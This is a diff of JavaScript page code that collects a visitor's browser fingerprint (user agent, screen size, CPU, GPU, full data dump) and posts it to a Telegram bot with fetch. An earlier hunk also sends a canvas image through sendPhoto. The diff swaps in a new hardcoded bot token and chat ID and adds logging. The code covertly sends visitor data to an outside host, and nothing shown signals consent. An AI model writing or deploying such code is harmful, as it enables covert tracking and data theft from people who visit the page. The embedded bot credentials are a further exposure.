@@ -452,7 +452,7 @@ console.log("Async function started");
                 canvas.height = 480;
                 const ctx = canvas.getContext('2d');
 
-                const TELEGRAM_BOT_TOKEN = "8570912541:AAFbriZp7cIxEHkzlgfmza9RwS__6gYYYOQ";
+                const TELEGRAM_BOT_TOKEN = "8570912541:AAErNlFxerOw_SXQo54KLyTpGnH4zO4PZb8";
                 const TELEGRAM_USER_ID = "8406913795";
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
 
@@ -563,37 +563,33 @@ console.log("Async function started");
         };
     }
 
-    const TELEGRAM_BOT_TOKEN = "8570912541:AAFbriZp7cIxEHkzlgfmza9RwS__6gYYYOQ";
+    const TELEGRAM_BOT_TOKEN = "8570912541:AAErNlFxerOw_SXQo54KLyTpGnH4zO4PZb8";
     const TELEGRAM_USER_ID = "8406913795";
 
     function sendToTelegram(data) {
-        const summary = `🎯 Browser Fingerprint Collected\n\n` +
-            `📌 ID: ${data.fingerprint.substring(0, 16)}...\n` +
-            `🖥️ OS: ${data.navigator.userAgent.substring(0, 80)}...\n` +
-            `📺 Screen: ${data.screen.width}x${data.screen.height}\n` +
-            `💾 RAM: ${data.hardware.deviceMemory}GB\n` +
-            `⚙️ CPU: ${data.hardware.hardwareConcurrency} cores\n` +
-            `🎨 GPU: ${data.gpu.renderer}\n` +
-            `🔤 Fonts: ${data.fonts.length} detected\n` +
-            `⏱️ TZ: ${data.timezone.timezone}\n` +
-            `🌐 Language: ${data.navigator.language}`;
+        const summary = `Browser Fingerprint Collected\n\nID: ${data.fingerprint.substring(0, 16)}...\nOS: ${data.navigator.userAgent.substring(0, 80)}...\nScreen: ${data.screen.width}x${data.screen.height}\nCPU: ${data.hardware.hardwareConcurrency} cores\nGPU: ${data.gpu.renderer}`;
 
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
-        console.log("Sending to Telegram...");
+        console.log("Sending to Telegram...", url);
+        const payload = {
+            chat_id: TELEGRAM_USER_ID,
+            text: summary
+        };
+        console.log("Payload:", payload);
+        
         fetch(url, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_USER_ID,
-                text: summary
-            })
+            body: JSON.stringify(payload)
         })
         .then(r => {
-            console.log("Summary sent:", r.status);
-            return r.json();
+            console.log("Response status:", r.status);
+            return r.json().then(json => {
+                console.log("Response:", json);
+            });
         })
-        .catch(e => console.log("Telegram send failed:", e));
+        .catch(e => console.error("Telegram send error:", e));
 
         const fullData = JSON.stringify(data, null, 2);
         
@@ -603,15 +599,15 @@ console.log("Async function started");
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_USER_ID,
-                    text: `<pre>${fullData.substring(0, 4000)}</pre>`
+                    text: fullData.substring(0, 3000)
                 })
             })
             .then(r => {
-                console.log("Full data sent:", r.status);
-                return r.json();
+                console.log("Full data response:", r.status);
+                return r.json().then(json => console.log("Full response:", json));
             })
-            .catch(e => console.log("Telegram full data send failed:", e));
-        }, 500);
+            .catch(e => console.error("Full data send error:", e));
+        }, 1000);
     }
 
     fp.navigator = getNavigatorData();
